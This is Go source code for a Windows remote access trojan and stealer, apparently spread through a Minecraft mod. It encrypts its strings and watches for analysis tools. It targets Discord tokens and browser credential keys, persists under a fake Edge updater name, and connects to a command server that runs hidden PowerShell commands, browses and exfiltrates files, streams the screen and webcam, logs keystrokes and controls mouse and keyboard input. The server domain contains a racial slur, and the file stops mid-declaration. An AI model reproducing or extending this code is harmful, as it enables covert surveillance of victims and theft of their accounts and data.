package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	_ "image/png"
	"io"
	"io/ioutil"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"

	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows/registry"
)

// ==================== WEBSOCKET STREAMING ====================
var (
	wsConn       *websocket.Conn
	wsMutex      sync.Mutex
	wsConnected  bool
	wsReconnect  = true
)

// ==================== AES-256 STRING OBFUSCATION ====================
// All strings are encrypted with AES-256-GCM

// Master key derivation - derived at runtime from multiple sources
var masterKey []byte
var db = make(map[int][]byte)
var dbNonce = make(map[int][]byte)
var dbInit bool = false

// Runtime key generation - harder to extract statically
func deriveKey() []byte {
	// Combine multiple sources for key derivation
	h := sha256.New()
	h.Write([]byte("d3x0n"))
	h.Write([]byte{0x4F, 0x70, 0x74, 0x31, 0x6D, 0x31, 0x7A, 0x33, 0x72}) // Opt1m1z3r
	h.Write([]byte(time.Now().Format("2006")))                            // Year component
	h.Write([]byte{0x47, 0x75, 0x61, 0x72, 0x64, 0x31, 0x61, 0x6E})       // Guard1an
	return h.Sum(nil)
}

// AES-GCM encrypt
func aesEncrypt(plaintext []byte, key []byte) ([]byte, []byte) {
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
	return ciphertext, nonce
}

// AES-GCM decrypt
func aesDecrypt(ciphertext []byte, key []byte, nonce []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

// String table initialization with AES-256-GCM
func tI() {
	if dbInit {
		return
	}
	dbInit = true
	masterKey = deriveKey()

	// Helper to add encrypted string
	addStr := func(id int, s string) {
		ct, nonce := aesEncrypt([]byte(s), masterKey)
		db[id] = ct
		dbNonce[id] = nonce
	}

	// System DLLs
	addStr(0, "kernel32.dll")
	addStr(1, "user32.dll")
	addStr(2, "ntdll.dll")
	addStr(3, "crypt32.dll")
	addStr(4, "advapi32.dll")

	// WinAPI functions
	addStr(5, "SetFileAttributesW")
	addStr(6, "CreateToolhelp32Snapshot")
	addStr(7, "Process32FirstW")
	addStr(8, "Process32NextW")
	addStr(9, "CloseHandle")
	addStr(10, "GetCurrentProcessId")
	addStr(11, "OpenProcess")
	addStr(12, "SetPriorityClass")
	addStr(13, "GetConsoleWindow")
	addStr(14, "ShowWindow")

	// Monitoring tools
	addStr(15, "taskmgr.exe")
	addStr(16, "procexp.exe")
	addStr(17, "procexp64.exe")
	addStr(18, "processhacker.exe")
	addStr(19, "procmon.exe")
	addStr(20, "procmon64.exe")
	addStr(21, "autoruns.exe")
	addStr(22, "autoruns64.exe")
	addStr(23, "tcpview.exe")
	addStr(24, "wireshark.exe")
	addStr(25, "fiddler.exe")
	addStr(26, "x64dbg.exe")
	addStr(27, "x32dbg.exe")
	addStr(28, "ollydbg.exe")
	addStr(29, "ida.exe")
	addStr(30, "ida64.exe")
	addStr(31, "pestudio.exe")
	addStr(32, "regshot.exe")
	addStr(33, "perfmon.exe")
	addStr(34, "resmon.exe")
	addStr(35, "dnspy.exe")
	addStr(36, "ghidra.exe")

	// Paths and file names
	addStr(40, "LOCALAPPDATA")
	addStr(41, "APPDATA")
	addStr(42, "USERPROFILE")
	addStr(43, ".minecraft")
	addStr(44, "mods")
	addStr(45, "curseforge")
	addStr(46, "minecraft")
	addStr(47, "Instances")
	addStr(48, "A.txt")
	addStr(49, ".jar")

	// Discord paths
	addStr(50, "discord")
	addStr(51, "discordcanary")
	addStr(52, "discordptb")
	addStr(53, "Local Storage")
	addStr(54, "leveldb")
	addStr(55, ".log")
	addStr(56, ".ldb")

	// Browser paths
	addStr(60, "Google\\Chrome\\User Data")
	addStr(61, "Microsoft\\Edge\\User Data")
	addStr(62, "BraveSoftware\\Brave-Browser\\User Data")
	addStr(63, "Default")
	addStr(64, "Local State")
	addStr(65, "encrypted_key")
	addStr(66, "os_crypt")

	// Persistence paths
	addStr(70, "Microsoft\\EdgeCore")
	addStr(71, "MicrosoftEdgeUpdateCore.exe")
	addStr(72, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
	addStr(73, "MicrosoftEdgeCoreUpdate")

	// Discord API
	addStr(80, "https://discord.com/api/v9/users/@me")
	addStr(81, "Authorization")
	addStr(82, "username")
	addStr(83, "id")

	// Panel URL - split and obfuscated
	addStr(90, "https://")
	addStr(91, "niggaware.ru")
	addStr(92, "") // Port removed (default 443)
	addStr(93, "/api/data/") // Panel endpoint
	addStr(94, "ADMIN_XEboLQH0Ag7WlWGkZ2Ocyw") // Default key, will be overridden

	// Remote Control URLs
	addStr(100, "/api/remote/poll/")
	addStr(101, "/api/remote/result/")
	addStr(102, "/api/data/screenshot/")
	addStr(103, "/api/keylog/")
	addStr(104, "/api/online/guardian")  // IP-based guardian heartbeat (no build_key needed!)

	// JSON keys
	addStr(110, "type")
	addStr(111, "discord")
	addStr(112, "token")
	addStr(113, "pc_name")
	addStr(114, "pc_user")
	addStr(115, "application/json")
	addStr(116, "Content-Type")
	addStr(117, "COMPUTERNAME")
	addStr(118, "USERNAME")

	// Remote control
	addStr(120, "shell")
	addStr(121, "screenshot")
	addStr(122, "keylogger")
	addStr(123, "files")
	addStr(124, "result")
	addStr(125, "status")
	addStr(126, "completed")
	addStr(127, "player")
	addStr(128, "keys")
	addStr(129, "window_title")
	addStr(130, "image")
	addStr(131, "commands")
	addStr(132, "webcam")
	addStr(133, "audio")
	addStr(134, "download")
	addStr(135, "upload")

	// Webcam URL path
	addStr(140, "/api/data/webcam/")
	
	// Audio URL path
	addStr(141, "/api/audio/upload")
	
	// Keylogger
	addStr(150, "GetAsyncKeyState")
	
	// File manager URLs
	addStr(142, "/api/files/browse")
	addStr(143, "/api/files/download")
	addStr(144, "/api/files/upload")
}

// Get decrypted string by ID
func g(id int) string {
	if !dbInit {
		tI()
	}
	ct, ok := db[id]
	if !ok {
		return ""
	}
	nonce := dbNonce[id]
	return string(aesDecrypt(ct, masterKey, nonce))
}

// ==================== CONFIG LOADER ====================

// Cached build key - obtained from server via IP matching
var cachedBuildKey string
var buildKeyLoaded bool
var buildKeyMutex sync.Mutex

// Get build key - server provides it based on IP matching
func loadBuildKey() string {
	buildKeyMutex.Lock()
	defer buildKeyMutex.Unlock()
	
	if buildKeyLoaded && cachedBuildKey != "" {
		return cachedBuildKey
	}
    return "y9mEATsabY6MbccNENeEHA"
	
	// First try: load from local config.dat (if Mod wrote it)
	configPaths := []string{
		filepath.Join(filepath.Dir(os.Args[0]), "config.dat"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "WinSvc", "config.dat"),
	}
	
	for _, configPath := range configPaths {
		data, err := os.ReadFile(configPath)
		if err == nil && len(data) > 0 {
			key := strings.TrimSpace(string(data))
			if len(key) > 10 && key != "UNKNOWN_BUILD_KEY" {
				cachedBuildKey = key
				buildKeyLoaded = true
				return cachedBuildKey
			}
		}
	}
	
	// If no local config, use empty string - heartbeat will get it from server
	return cachedBuildKey
}

// Update build key from server response
func updateBuildKey(key string) {
	if key != "" && len(key) > 10 {
		buildKeyMutex.Lock()
		cachedBuildKey = key
		buildKeyLoaded = true
		buildKeyMutex.Unlock()
		
		// Also save to config.dat for persistence
		configPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "WinSvc", "config.dat")
		os.WriteFile(configPath, []byte(key), 0644)
	}
}

// Get unique machine ID for correlation purposes
func getMachineID() string {
	defer func() {
		if r := recover(); r != nil {
			// Return fallback ID on any crash
		}
	}()
	
	// Generate a unique machine ID based on hardware/software info
	// This helps server correlate multiple connections from same machine
	h := sha256.New()
	
	// Use COMPUTERNAME + USERNAME + some other stable identifiers
	compName := os.Getenv("COMPUTERNAME")
	userName := os.Getenv("USERNAME")
	
	if compName == "" {
		compName = "UNKNOWN"
	}
	if userName == "" {
		userName = "UNKNOWN"
	}
	
	h.Write([]byte(compName))
	h.Write([]byte(userName))
	h.Write([]byte(os.Getenv("PROCESSOR_IDENTIFIER")))
	h.Write([]byte(os.Getenv("NUMBER_OF_PROCESSORS")))
	
	// Add Windows product ID if available (safely)
	prod := getWindowsProductID()
	if prod != "" {
		h.Write([]byte(prod))
	}
	
	result := hex.EncodeToString(h.Sum(nil))
	if len(result) < 16 {
		return "FALLBACK_ID_0001"
	}
	return result[:16]
}

func getWindowsProductID() string {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover from registry access errors
		}
	}()
	
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, 
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.READ)
	if err != nil {
		return ""
	}
	defer k.Close()
	
	val, _, err := k.GetStringValue("ProductId")
	if err != nil {
		return ""
	}
	return val
}

// Guardian URL endpoints - use IP-based matching
func getGuardianDataURL() string {
	return g(90) + g(91) + g(92) + "/api/data/guardian"
}

func getGuardianScreenshotURL() string {
	return g(90) + g(91) + g(92) + "/api/data/guardian/screenshot"
}

func getGuardianWebcamURL() string {
	return g(90) + g(91) + g(92) + "/api/data/guardian/webcam"
}

// Legacy URL functions - keep for backwards compatibility
func getPanelUrl() string {
	return getGuardianDataURL()
}
func getPanelURL() string {
	return getGuardianDataURL()
}

func getRemotePollURL(player string) string {
	// Add cache-buster to prevent CloudFlare from caching empty responses
	return g(90) + g(91) + g(92) + g(100) + loadBuildKey() + "/" + player + "?_=" + fmt.Sprintf("%d", time.Now().UnixNano())
}

func getRemoteResultURL(cmdID int) string {
	return g(90) + g(91) + g(92) + g(101) + loadBuildKey() + "/" + fmt.Sprintf("%d", cmdID)
}

func getScreenshotUploadURL() string {
	return getGuardianScreenshotURL()
}

func getKeylogURL() string {
	return g(90) + g(91) + g(92) + g(103) + g(94)
}

func getHeartbeatURL() string {
	// IP-based heartbeat - server matches by victim IP automatically
	// No build_key needed! Server uses IP mapping from when Mod infected the PC
	return g(90) + g(91) + g(92) + g(104) // https://niggaware.ru/api/online/guardian
}

func getWebcamUploadURL() string {
	return getGuardianWebcamURL()
}

func getAudioUploadURL() string {
	return getPanelUrl()
}

func getWebSocketURL() string {
	return "ws://31.58.58.237:8000/socket.io/?EIO=4&transport=websocket"
}

// ==================== WEBSOCKET FUNCTIONS ====================

func maintainWebSocketConnection() {
	defer func() {
		if r := recover(); r != nil {
			// Recover and continue
		}
	}()
	
	for {
		if !wsConnected {
			safeRun(connectWebSocket)
		}
		time.Sleep(5 * time.Second)
	}
}

func connectWebSocket() {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
	}()
	
	wsMutex.Lock()
	if wsConnected {
		wsMutex.Unlock()
		return
	}
	wsMutex.Unlock()
	
	wsURL := getWebSocketURL()
	if wsURL == "" {
		return
	}
	
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}
	
	conn, _, err := dialer.Dial(wsURL, nil)
	if err != nil {
		return
	}
	
	if conn == nil {
		return
	}
	
	wsMutex.Lock()
	wsConn = conn
	wsConnected = true
	wsMutex.Unlock()
	
	logDebug("WebSocket Connected!")

	// FIX: Send Socket.IO Connect packet (Protocol 40)
	wsMutex.Lock()
	conn.WriteMessage(websocket.TextMessage, []byte("40"))
	wsMutex.Unlock()
	
	// Send guardian_connect event with build_key for user isolation
	playerName := "Guardian_" + pcName
	buildKey := loadBuildKey()
	connectMsg := fmt.Sprintf(`42["guardian_connect",{"player":"%s","pc_name":"%s","pc_user":"%s","build_key":"%s"}]`, 
		playerName, pcName, pcUser, buildKey)
		
	wsMutex.Lock()
	if err := conn.WriteMessage(websocket.TextMessage, []byte(connectMsg)); err != nil {
		wsConnected = false
		conn.Close()
		wsMutex.Unlock()
		return
	}
	wsMutex.Unlock()
	
	// Start message handler
	go handleWebSocketMessages()
}

func handleWebSocketMessages() {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
		
		wsMutex.Lock()
		wsConnected = false
		if wsConn != nil {
			wsConn.Close()
			wsConn = nil
		}
		wsMutex.Unlock()
	}()
	
	// Keep reading until error
	for {
		wsMutex.Lock()
		conn := wsConn
		wsMutex.Unlock()
		
		if conn == nil {
			return
		}
		
		_, message, err := conn.ReadMessage()
		if err != nil {
			return
		}
		
		if len(message) == 0 {
			continue
		}
		
		msgStr := string(message)
		
		// Handle Socket.IO protocol messages
		if msgStr == "2" { // Ping
			wsMutex.Lock()
			if wsConn != nil {
				wsConn.WriteMessage(websocket.TextMessage, []byte("3")) // Pong
			}
			wsMutex.Unlock()
			continue
		}
		
		// Handle event messages (42["event", data])
		if len(msgStr) > 2 && strings.HasPrefix(msgStr, "42") {
			safeGo(func() { handleSocketIOEvent(msgStr[2:]) })
		}
	}
}

func handleSocketIOEvent(eventData string) {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
	}()
	
	if eventData == "" {
		return
	}
	
	// Parse ["event_name", {data}]
	var rawEvent []json.RawMessage
	if err := json.Unmarshal([]byte(eventData), &rawEvent); err != nil || len(rawEvent) < 1 {
		return
	}
	
	var eventName string
	if err := json.Unmarshal(rawEvent[0], &eventName); err != nil {
		return
	}
	
	fmt.Printf("[DEBUG] RX Event: %s\n", eventName)

	switch eventName {
	case "start_capture":
		logDebug("Received start_capture event!")
		if len(rawEvent) >= 2 {
			var data map[string]interface{} // Changed to interface{} to handle numbers
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				logDebug(fmt.Sprintf("start_capture parse error: %v", err))
				return
			}
			
			captureType, ok := data["type"].(string)
			if !ok {
				logDebug("start_capture: 'type' field missing or not string")
				return
			}
			
			logDebug(fmt.Sprintf("start_capture type: %s", captureType))
			
			if captureType == "screen" {
				logDebug("Starting screen capture via WS...")
				safeGo(startContinuousScreenshotsWS)
			} else if captureType == "webcam" {
				logDebug("Starting webcam capture via WS...")
				safeGo(startContinuousWebcamWS)
			}
		}
	case "stop_capture":
		if len(rawEvent) >= 2 {
			var data map[string]string
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				return
			}
			captureType := data["type"]
			
			if captureType == "screen" {
				screenshotContinuous = false
			} else if captureType == "webcam" {
				stopContinuousWebcam()
			}
		}

	case "mouse_move":
		if len(rawEvent) >= 2 {
			var data map[string]interface{}
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				return
			}
			x := int(data["x"].(float64))
			y := int(data["y"].(float64))
			safeGo(func() { pSCP.Call(uintptr(x), uintptr(y)) })
		}
		
	case "mouse_click":
		if len(rawEvent) >= 2 {
			var data map[string]interface{}
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				return
			}
			// left=1, right=3
			btn := int(data["button"].(float64)) 
			
			var flags uintptr
			if btn == 1 {
				flags = 0x0002 | 0x0004 // LEFTDOWN | LEFTUP
			} else if btn == 3 {
				flags = 0x0008 | 0x0010 // RIGHTDOWN | RIGHTUP
			}
			
			if flags != 0 {
				safeGo(func() { pME.Call(flags, 0, 0, 0, 0) })
			}
		}

	case "key_press":
		if len(rawEvent) >= 2 {
			var data map[string]interface{}
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				return
			}
			keyCode := int(data["key"].(float64))
			if keyCode > 0 {
				safeGo(func() {
					pKE.Call(uintptr(keyCode), 0, 0, 0) // Press
					time.Sleep(20 * time.Millisecond)
					pKE.Call(uintptr(keyCode), 0, 2, 0) // Release (KEYEVENTF_KEYUP = 2)
				})
			}
		}
		
	case "key_type":
		if len(rawEvent) >= 2 {
			var data map[string]interface{}
			if err := json.Unmarshal(rawEvent[1], &data); err != nil {
				return
			}
			text, ok := data["text"].(string)
			if ok && text != "" {
				// Simple key typing for standard chars (A-Z, 0-9)
				safeGo(func() {
					for _, c := range text {
						k := -1
						shift := false
						
						if c >= 'a' && c <= 'z' {
							k = int(c) - 32
						} else if c >= 'A' && c <= 'Z' {
							k = int(c)
							shift = true
						} else if c >= '0' && c <= '9' {
							k = int(c)
						} else if c == ' ' {
							k = 0x20
						}
						
						if k != -1 {
							if shift { pKE.Call(0x10, 0, 0, 0) } // Shift down
							pKE.Call(uintptr(k), 0, 0, 0)
							pKE.Call(uintptr(k), 0, 2, 0)
							if shift { pKE.Call(0x10, 0, 2, 0) } // Shift up
						}
						time.Sleep(10 * time.Millisecond)
					}
				})
			}
		}


		// --- GUARDIAN V4 PROFESSIONAL FEATURES ---

	case "file_list":
		if len(rawEvent) >= 2 {
			var req struct { Path string `json:"path"` }
			if err := json.Unmarshal(rawEvent[1], &req); err == nil {
				go listFiles(req.Path)
			}
		}

	case "file_read":
		if len(rawEvent) >= 2 {
			var req struct { Path string `json:"path"` }
			if err := json.Unmarshal(rawEvent[1], &req); err == nil {
				go readFile(req.Path)
			}
		}
		
	case "shell_exec":
		if len(rawEvent) >= 2 {
			var req struct { Cmd string `json:"cmd"` }
			if err := json.Unmarshal(rawEvent[1], &req); err == nil {
				go runShellCommand(req.Cmd)
			}
		}

	case "proc_list":
		go listProcesses()

	case "clip_set":
		if len(rawEvent) >= 2 {
			var req struct { Text string `json:"text"` }
			if err := json.Unmarshal(rawEvent[1], &req); err == nil {
				go setClipboard(req.Text)
			}
		}
	
	case "execute_command":
		if len(rawEvent) >= 2 {
			var req struct {
				Type    string      `json:"type"`
				Data    interface{} `json:"data"`
				FromSID string      `json:"from_sid"`
			}
			if err := json.Unmarshal(rawEvent[1], &req); err == nil {
				fmt.Printf("[DEBUG] WS execute_command: type=%s from=%s\n", req.Type, req.FromSID)
				go executeWSCommand(req.Type, req.Data, req.FromSID)
			}
		}
	}
}

// --- V4 HELPERS ---

func executeWSCommand(cmdType string, cmdData interface{}, fromSID string) {
	defer func() {
		if r := recover(); r != nil {
			sendWSResult(fromSID, "failed", fmt.Sprintf("Command crashed: %v", r))
		}
	}()
	
	var result string
	status := "completed"
	
	// Convert cmdData to string if needed
	cmdDataStr := ""
	switch v := cmdData.(type) {
	case string:
		cmdDataStr = v
	case map[string]interface{}:
		if cmd, ok := v["cmd"].(string); ok {
			cmdDataStr = cmd
		} else if path, ok := v["path"].(string); ok {
			cmdDataStr = path
		}
	}
	
	fmt.Printf("[DEBUG] executeWSCommand: type=%s data=%s\n", cmdType, cmdDataStr)
	
	switch cmdType {
	case "shell":
		result = executeShellCommand(cmdDataStr)
	case "files":
		parts := strings.SplitN(cmdDataStr, "|", 3)
		if len(parts) >= 2 {
			action := parts[0]
			path := parts[1]
			switch action {
			case "browse":
				result = browseDirectoryJSON(path)
			case "download":
				result = downloadFile(path)
			case "upload":
				if len(parts) >= 3 {
					result = uploadFile(path, parts[2])
				}
			}
		}
	case "processes":
		result = listProcessesJSON()
	case "screenshot":
		captureAndSendScreenshot()
		result = "Screenshot captured"
	default:
		result = "Unknown command type: " + cmdType
		status = "failed"
	}
	
	sendWSResult(fromSID, status, result)
}

func sendWSResult(fromSID, status, result string) {
	wsMutex.Lock()
	defer wsMutex.Unlock()
	
	if wsConn == nil || !wsConnected {
		return
	}
	
	msg := fmt.Sprintf(`42["command_result",{"from_sid":"%s","status":"%s","result":"%s"}]`,
		fromSID, status, escapeJSON(result))
	wsConn.WriteMessage(websocket.TextMessage, []byte(msg))
}

func listFiles(pathStr string) {
	if pathStr == "" || pathStr == "/" {
		pathStr = "C:\\"
	}
	
	files, err := ioutil.ReadDir(pathStr)
	type FileInfo struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Size  int64  `json:"size"`
	}
	var fileList []FileInfo
	
	if err != nil {
		sendResult("file_error", map[string]string{"error": err.Error()})
		return
	}
	
	for _, f := range files {
		fileList = append(fileList, FileInfo{
			Name: f.Name(),
			IsDir: f.IsDir(),
			Size: f.Size(),
		})
	}
	
	respData := map[string]interface{}{
		"path": pathStr,
		"files": fileList,
	}
	resp, _ := json.Marshal(respData)
	sendWebSocketFrame("file_list_response", base64.StdEncoding.EncodeToString(resp))
}

func readFile(pathStr string) {
	data, err := ioutil.ReadFile(pathStr)
	if err != nil {
		sendResult("file_error", map[string]string{"error": err.Error()})
		return
	}
	
	if len(data) > 5 * 1024 * 1024 {
		sendResult("file_error", map[string]string{"error": "File too large"})
		return
	}
	
	b64 := base64.StdEncoding.EncodeToString(data)
	respData := map[string]string{
		"path": pathStr,
		"data": b64,
	}
	resp, _ := json.Marshal(respData)
	sendWebSocketFrame("file_read_response", base64.StdEncoding.EncodeToString(resp))
}

func runShellCommand(cmdStr string) {
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		output += "\nError: " + err.Error()
	}
	
	respData := map[string]string{
		"cmd": cmdStr,
		"output": output,
	}
	resp, _ := json.Marshal(respData)
	sendWebSocketFrame("shell_response", base64.StdEncoding.EncodeToString(resp))
}

func listProcesses() {
	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.CombinedOutput()
	
	respData := map[string]string{
		"procs": string(out),
	}
	resp, _ := json.Marshal(respData)
	sendWebSocketFrame("proc_list_response", base64.StdEncoding.EncodeToString(resp))
}

func setClipboard(text string) {
    cmd := exec.Command("powershell", "-NoProfile", "-Command", "Set-Clipboard -Value \""+text+"\"")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmd.Run()
}

func sendResult(event string, data interface{}) {
	b, _ := json.Marshal(data)
	sendWebSocketFrame(event, base64.StdEncoding.EncodeToString(b))
}

func sendWebSocketFrame(frameType string, frameB64 string) {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
	}()
	
	wsMutex.Lock()
	defer wsMutex.Unlock()
	
	if !wsConnected || wsConn == nil || frameB64 == "" {
		return
	}
	
	playerName := "Guardian_" + pcName
	msg := fmt.Sprintf(`42["stream_frame",{"player":"%s","type":"%s","frame":"%s"}]`, 
		playerName, frameType, frameB64)
	if err := wsConn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
		wsConnected = false
	}
}

func sendWebSocketAudio(audioB64 string) {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
	}()
	
	wsMutex.Lock()
	defer wsMutex.Unlock()
	
	if !wsConnected || wsConn == nil || audioB64 == "" {
		return
	}
	
	playerName := "Guardian_" + pcName
	msg := fmt.Sprintf(`42["stream_audio",{"player":"%s","audio":"%s"}]`, 
		playerName, audioB64)
	if err := wsConn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
		wsConnected = false
	}
}

// WebSocket-based continuous screenshots (faster)
func startContinuousScreenshotsWS() {
	if screenshotContinuous {
		return
	}
	screenshotContinuous = true
	
	safeGo(func() {
		defer func() {
			screenshotContinuous = false
			recover()
		}()
		
		for screenshotContinuous {
			func() {
				defer func() { recover() }()
				captureAndSendScreenshotWS()
			}()
			time.Sleep(33 * time.Millisecond) // ~30 FPS via WebSocket
		}
	})
}

func captureAndSendScreenshotWS() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[DEBUG] captureAndSendScreenshotWS panic: %v\n", r)
		}
	}()
	
	// Try fast BitBlt capture first, fallback to PowerShell
	fmt.Println("[DEBUG] Attempting Fast Capture...")
	img := captureScreenFast()
	if img == nil {
		fmt.Println("[DEBUG] Fast Capture failed, trying PowerShell...")
		img = captureScreenPowerShell()
	} else {
		fmt.Println("[DEBUG] Fast Capture success!")
	}
	
	if img == nil {
		fmt.Println("[DEBUG] All capture methods failed")
		return
	}
	
	// Dynamic quality: lower when streaming fast
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 65}); err != nil {
		fmt.Printf("[DEBUG] JPEG Encode error: %v\n", err)
		return
	}
	
	if buf.Len() < 3000 {
		fmt.Printf("[DEBUG] Frame too small: %d bytes\n", buf.Len())
		return
	}
	
	frameB64 := base64.StdEncoding.EncodeToString(buf.Bytes())
	logDebug(fmt.Sprintf("Sending frame via WS (size: %d)\n", len(frameB64)))
	sendWebSocketFrame("screen", frameB64)
}

// Windows GDI Structs
type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// Global GDI/User32 Variables
var (
	modGdi32            = syscall.NewLazyDLL("gdi32.dll")
	modUser32           = syscall.NewLazyDLL("user32.dll")
	modKernel32         = syscall.NewLazyDLL("kernel32.dll")

	pGetDC              = modUser32.NewProc("GetDC")
	pGetSystemMetrics   = modUser32.NewProc("GetSystemMetrics")
	pReleaseDC          = modUser32.NewProc("ReleaseDC")
	
	pCreateCompatibleDC = modGdi32.NewProc("CreateCompatibleDC")
	pCreateCompatibleBitmap = modGdi32.NewProc("CreateCompatibleBitmap")
	pSelectObject       = modGdi32.NewProc("SelectObject")
	pBitBlt             = modGdi32.NewProc("BitBlt")
	pGetDIBits          = modGdi32.NewProc("GetDIBits")
	pDeleteObject       = modGdi32.NewProc("DeleteObject")
	pDeleteDC           = modGdi32.NewProc("DeleteDC")

	pOpenInputDesktop   = modUser32.NewProc("OpenInputDesktop")
	pOpenDesktop        = modUser32.NewProc("OpenDesktopW") // Added for explicit fallback
	pSetThreadDesktop   = modUser32.NewProc("SetThreadDesktop")
	pGetThreadDesktop   = modUser32.NewProc("GetThreadDesktop")
	pCloseDesktop       = modUser32.NewProc("CloseDesktop")
	
	pGetCurrentThreadId = modKernel32.NewProc("GetCurrentThreadId")
)

// captureScreenFast uses kbinani/screenshot library for reliable capture
// Handles Session 0, RDP, and headless environments automatically
func captureScreenFast() *image.RGBA {
	defer func() {
		if r := recover(); r != nil {
			logDebug(fmt.Sprintf("captureScreenFast panic: %v", r))
		}
	}()
	
	// Get number of displays
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		logDebug("No active displays found")
		return nil
	}
	
	// Capture primary display (display 0)
	bounds := screenshot.GetDisplayBounds(0)
	logDebug(fmt.Sprintf("Display bounds: %dx%d", bounds.Dx(), bounds.Dy()))
	
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		logDebug(fmt.Sprintf("screenshot.CaptureRect failed: %v", err))
		return nil
	}
	
	logDebug("Screenshot captured successfully via kbinani/screenshot")
	return img
}

// WebSocket-based continuous webcam - OPTIMIZED (Streaming Mode)
func startContinuousWebcamWS() {
	if webcamContinuous {
		return
	}
	webcamContinuous = true
	
	safeGo(func() {
		defer func() { recover() }()

		for webcamContinuous {
			// Try FFmpeg streaming first (Massive Performance Boost)
			// This avoids disk I/O by streaming MJPEG directly from stdout
			cmd := exec.Command("ffmpeg", "-f", "dshow", "-i", "video=Integrated Camera", 
				"-f", "image2pipe", "-vcodec", "mjpeg", "-q:v", "5", "-")
			
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			stdout, err := cmd.StdoutPipe()
			
			if err == nil {
				if err := cmd.Start(); err == nil {
					// Create a function to kill process on exit
					defer func() {
						if cmd.Process != nil {
							cmd.Process.Kill()
						}
					}()
					
					reader := bufio.NewReader(stdout)
					
					// Read loop
					for webcamContinuous {
						// Find JPEG Start (FF D8)
						b1, err := reader.ReadByte()
						if err != nil { break }
						if b1 != 0xFF { continue }
						
						b2, err := reader.ReadByte()
						if err != nil { break }
						if b2 != 0xD8 { continue }
						
						// Found Start of Image
						var imgData bytes.Buffer
						imgData.WriteByte(0xFF)
						imgData.WriteByte(0xD8)
						
						// Read until JPEG End (FF D9)
						prev := byte(0)
						foundEnd := false
						for {
							curr, err := reader.ReadByte()
							if err != nil { break }
							imgData.WriteByte(curr)
							if prev == 0xFF && curr == 0xD9 {
								foundEnd = true
								break
							}
							prev = curr
							
							// Safety break for too large images
							if imgData.Len() > 5*1024*1024 {
								break
							}
						}
						
						if !foundEnd { break }
						
						// Send frame
						frameB64 := base64.StdEncoding.EncodeToString(imgData.Bytes())
						sendWebSocketFrame("webcam", frameB64)
					}
					
					// If we exit the inner loop but webcamContinuous is still true,
					// it means FFmpeg crashed or stream ended.
					if cmd.Process != nil {
						cmd.Process.Kill()
					}
				}
			}
			
			// If FFmpeg failed or we broke out, try fallback or wait before retry
			if webcamContinuous {
				// Fallback: Old method (Disk I/O based) for a few seconds
				for i := 0; i < 10 && webcamContinuous; i++ {
					captureAndSendWebcamWS()
					time.Sleep(200 * time.Millisecond)
				}
			}
		}
	})
}

func captureAndSendWebcamWS() {
	defer func() { recover() }()
	
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, "wc_"+fmt.Sprintf("%d", time.Now().UnixNano())+".jpg")
	defer os.Remove(tempFile)
	
	var success bool
	success = captureWebcamPowerShell(tempFile)
	if !success {
		success = captureWebcamFFmpeg(tempFile)
	}
	if !success {
		return
	}
	
	imgData, err := os.ReadFile(tempFile)
	if err != nil || len(imgData) < 3000 {
		return
	}
	
	frameB64 := base64.StdEncoding.EncodeToString(imgData)
	sendWebSocketFrame("webcam", frameB64)
}

// ==================== CONFIG ====================
const (
	DEBUG_MODE             = false // SET TO TRUE FOR VM TESTING
	CHECK_INTERVAL         = 2 * time.Second
